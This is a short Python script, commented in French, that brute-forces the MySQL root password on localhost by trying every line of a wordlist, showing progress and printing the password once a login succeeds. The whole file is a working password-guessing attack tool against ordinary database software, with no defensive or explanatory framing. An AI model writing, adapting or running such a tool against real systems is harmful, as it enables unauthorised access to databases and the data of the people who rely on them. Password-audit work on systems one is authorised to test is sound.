# coding:utf-8
from time import time

import MySQLdb
import sys

#Counter class
class Counter:
    def __init__(self, until):
        self.count = 0
        self.last_print = 0
        self.until = until

    def iterate(self):
        self.count += 1

        if time() - self.last_print > 0.1:
            self.last_print = time()
            print(f"Tested {self.count} passwords : {((self.count / self.until) * 100):.2f} %", end="\r")


fd = open(sys.argv[1])
liste_pass = fd.readlines()
counter = Counter(liste_pass.__len__())
i = 0
for password in liste_pass:
    # Essai sinon itère le conteur
    try:
        MySQLdb.connect("localhost", "root", password.rstrip(), "mysql")
        print('\n')
        print("===== Mot de passe trouve !!=====\n")
        print("         " + password)
        print("=================================")
        sys.exit(0)
    except MySQLdb.Error as e:
        counter.iterate()

fd.close()
